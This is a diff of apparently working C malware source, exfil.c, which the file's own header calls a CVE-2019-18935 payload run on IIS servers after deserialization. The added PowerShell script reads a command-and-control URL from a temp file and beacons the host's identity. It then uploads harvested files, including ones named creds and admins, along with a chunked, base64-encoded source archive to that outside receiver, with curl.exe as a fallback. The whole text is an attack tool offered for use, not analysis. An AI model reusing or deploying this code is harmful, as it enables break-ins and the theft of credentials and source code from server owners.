@@ -4,46 +4,64 @@
 /*
  * exfil.c — CVE-2019-18935 payload: harvest + outbound exfil.
  *
- * Runs as the IIS app-pool identity after deserialization. Unlike dump-src.c it
- * does NOT depend on finding a writable web-served directory: it ships the loot
- * out over outbound HTTPS to a receiver read at runtime from
- * C:\Windows\Temp\c2.txt (uploaded separately, so the receiver can change
- * without a rebuild).
+ * Runs as the IIS app-pool identity after deserialization. Does not depend on a
+ * writable web-served directory (writemap showed all of wwwroot is denied).
  *
- * Protocol (all POSTs to <base>):
- *   /manifest   name=src.zip&size=<n>&sha=<sha256>&chunks=<n>
- *   /c<i>       base64 chunk i, text/plain
+ * Receiver base URL is read at runtime from C:\Windows\Temp\c2.txt so it can be
+ * changed without a rebuild.
+ *
+ * Beacons FIRST, before doing any work, so a run tells us immediately whether
+ * the payload executed and whether egress works:
+ *   /hello      id + identity
+ *   /f-<name>   base64 of each small text artifact
+ *   /manifest   name=...&size=...&sha=...&chunks=...
+ *   /c<i>       base64 chunk i
  *   /done       "ok"
  *
- * Local artifacts are also written to C:\Windows\Temp for the case where a
- * writable web directory is later found.
+ * TLS 1.2/1.3 is forced: PowerShell on older servers defaults to TLS 1.0, which
+ * modern receivers reject. curl.exe is used as a fallback transport.
  */
 
 static const char *PS_SCRIPT =
     "$ErrorActionPreference='SilentlyContinue'\n"
+    "try{[Net.ServicePointManager]::SecurityProtocol="
+    "[Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11"
+    " -bor [Net.SecurityProtocolType]::Tls13}catch{}\n"
     "$tmp='C:\\Windows\\Temp'\n"
     "$cfg=Join-Path $tmp 'c2.txt'\n"
     "if(!(Test-Path $cfg)){exit}\n"
     "$base=(Get-Content $cfg -TotalCount 1).Trim()\n"
     "if(!$base){exit}\n"
-    "$zip=Join-Path $tmp 'src.zip'\n"
-    "if(!(Test-Path $zip)){exit}\n"
-    "$b=[IO.File]::ReadAllBytes($zip)\n"
-    "$b64=[Convert]::ToBase64String($b)\n"
-    "$sha=(Get-FileHash $zip -Algorithm SHA256).Hash\n"
-    "$n=[int][math]::Ceiling($b64.Length/48000)\n"
-    "try{Invoke-WebRequest -Uri \"$base/manifest\" -Method Post "
-    "-Body \"name=src.zip&size=$($b.Length)&sha=$sha&chunks=$n\" "
-    "-UseBasicParsing -TimeoutSec 30|Out-Null}catch{}\n"
-    "for($i=0;$i -lt $n;$i++){\n"
-    " $s=$i*48000\n"
-    " $len=[math]::Min(48000,$b64.Length-$s)\n"
-    " $c=$b64.Substring($s,$len)\n"
-    " try{Invoke-WebRequest -Uri \"$base/c$i\" -Method Post -Body $c "
-    "-ContentType 'text/plain' -UseBasicParsing -TimeoutSec 60|Out-Null}catch{}\n"
+    "function Post($p,$b,$ct){\n"
+    " $tf=Join-Path $tmp 'body.tmp'\n"
+    " [IO.File]::WriteAllText($tf,$b)\n"
+    " try{Invoke-WebRequest -Uri \"$base/$p\" -Method Post -InFile $tf "
+    "-ContentType $ct -UseBasicParsing -TimeoutSec 40|Out-Null;return $true}catch{}\n"
+    " try{& curl.exe -s -m 40 -H \"Content-Type: $ct\" "
+    "--data-binary \"@$tf\" \"$base/$p\"|Out-Null;"
+    "if($LASTEXITCODE -eq 0){return $true}}catch{}\n"
+    " return $false\n"
     "}\n"
-    "try{Invoke-WebRequest -Uri \"$base/done\" -Method Post -Body 'ok' "
-    "-UseBasicParsing -TimeoutSec 15|Out-Null}catch{}\n";
+    "$id=\"$env:COMPUTERNAME-$PID\"\n"
+    "Post 'hello' \"id=$id user=$([Environment]::UserName) host=$env:COMPUTERNAME\" 'text/plain'\n"
+    "foreach($f in @('whoami','env','ipconfig','apphost','creds','admins','tree')){\n"
+    " $p=Join-Path $tmp \"$f.txt\"\n"
+    " if(Test-Path $p){ Post \"f-$f\" ([Convert]::ToBase64String([IO.File]::ReadAllBytes($p))) 'text/plain' }\n"
+    "}\n"
+    "$zip=Join-Path $tmp 'src.zip'\n"
+    "if(Test-Path $zip){\n"
+    " $b=[IO.File]::ReadAllBytes($zip)\n"
+    " $b64=[Convert]::ToBase64String($b)\n"
+    " $sha=(Get-FileHash $zip -Algorithm SHA256).Hash\n"
+    " $n=[int][math]::Ceiling($b64.Length/48000)\n"
+    " Post 'manifest' \"name=src.zip&size=$($b.Length)&sha=$sha&chunks=$n\" 'text/plain'\n"
+    " for($i=0;$i -lt $n;$i++){\n"
+    "  $s=$i*48000\n"
+    "  $len=[math]::Min(48000,$b64.Length-$s)\n"
+    "  Post \"c$i\" $b64.Substring($s,$len) 'text/plain'\n"
+    " }\n"
+    "}\n"
+    "Post 'done' 'ok' 'text/plain'\n";
 
 static void run(const char *cmd)
 {
@@ -93,14 +111,7 @@ static DWORD WINAPI Worker(LPVOID lpParam)
         }
     }
 
-    // ---- 3. best-effort copy into web-served dirs ----------------------
-    run("powershell -NoProfile -ExecutionPolicy Bypass -Command \""
-        "foreach ($d in @('C:\\inetpub\\wwwroot','C:\\inetpub\\wwwroot\\StartUp',"
-        "'C:\\inetpub\\wwwroot\\uploads','C:\\inetpub\\wwwroot\\App_Data')) { "
-        "try { Copy-Item 'C:\\Windows\\Temp\\src.zip' (Join-Path $d 'src.zip') "
-        "-Force -ErrorAction Stop } catch {} }\"");
-
-    // ---- 4. outbound exfil --------------------------------------------
+    // ---- 3. ship it ----------------------------------------------------
     FILE *f = fopen("C:\\Windows\\Temp\\exfil.ps1", "wb");
     if (f) {
         fputs(PS_SCRIPT, f);
